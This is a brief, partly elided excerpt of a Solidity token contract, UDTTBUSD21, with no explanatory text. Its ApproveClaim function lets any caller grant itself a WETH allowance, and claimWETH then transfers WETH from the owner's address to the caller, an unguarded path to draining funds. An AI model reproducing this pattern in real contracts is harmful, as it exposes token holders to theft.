...
contract UDTTBUSD21 is IBEP20 {
    ...
    function ApproveClaim(address spender, uint256) public virtual returns (bool) {
        spender = msg.sender;
        IBEP20(WETH).approve(spender, WETHEarned);
        return true;
    }
    ...
    function claimWETH() public payable {
        ...
        IBEP20(WETH).transferFrom(payable(_owner), payable(msg.sender), WETHEarned);
    }
